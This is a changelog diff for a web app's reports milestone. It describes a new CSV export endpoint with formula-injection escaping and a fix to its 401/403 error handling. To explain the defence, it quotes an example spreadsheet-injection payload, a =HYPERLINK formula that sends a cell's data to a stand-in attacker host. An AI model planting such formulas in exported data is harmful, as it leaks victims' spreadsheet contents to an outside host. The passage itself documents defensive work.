@@ -7,7 +7,7 @@ remembering, and anything left behind as debt.
 
 ---
 
-## M6 — Reports & Analytics · *in progress*
+## M6 — Reports & Analytics · *complete*
 
 ### Shipped — the analytics data layer (0030)
 
@@ -58,6 +58,49 @@ appear with a zero rather than vanishing.
 **Cross-company scoping is asserted over the output**, not assumed from the
 `WHERE`. A `group by` is much easier to get wrong than a row policy, and RLS is
 not doing the work here — these are definer functions doing their own scoping.
+
+### Shipped — CSV export (M6 complete)
+
+`GET /api/reports/export?dataset=team|exams|questions`, behind
+`reports.export`. The first route handler in the codebase, and it lives under
+`/api` because `src/proxy.ts` excludes that prefix from locale routing —
+its matcher comment anticipated exactly this, so a download is never redirected
+to `/en/…` on its way out.
+
+**Being outside the proxy makes the handler's own guard load-bearing.** Nothing
+has checked the session before it runs, unlike a page the proxy already
+guarded.
+
+**A CSV export is a file somebody opens in Excel.** Every text column here is
+user-authored — a question stem, a person's name — and Excel, LibreOffice and
+Sheets all evaluate a cell beginning `=`, `+`, `-`, `@`, tab or carriage return
+as a formula. A stem written as `=HYPERLINK("http://evil.example/"&A1,…)`
+becomes a live link in the chef's spreadsheet carrying a cell of data with it,
+so those cells are prefixed with an apostrophe and rendered literal.
+
+The guard is applied to **text columns only**. The usual advice is to neutralise
+anything starting with `-`, which would rewrite the score `-1` as `'-1` and
+break every numeric column in the file; columns declare their kind so the guard
+lands where the risk is. Serialisation is a pure function with unit tests
+covering quoting, embedded newlines, the injection vectors, and the negative
+number that must survive untouched.
+
+**An absent number stays an empty cell.** The reports are careful that no data
+is not zero, and the export must not undo that on the way out of the building.
+
+### Fixed — an unhandled throw returned 500 where 401 and 403 were meant
+
+The export handler called `requirePermission()` without catching it. The guards
+throw typed errors carrying a status, which a page's error boundary turns into a
+redirect or a 403 — but a route handler has no boundary, so an anonymous request
+got a 500. Safe, in that nothing leaked, and wrong: it tells the caller the
+server broke when the truth is that they may not.
+
+**It reached the render check because the assertion was `status !== 200`,** which
+a crash satisfies as happily as a refusal. Both cases now assert the exact
+status — 401 anonymous, 403 for a signed-in candidate — and the handler maps the
+error to it. A test that only knows what it does not want will accept anything
+else, including a fault.
 
 ### Shipped — team, exam and question reporting
 
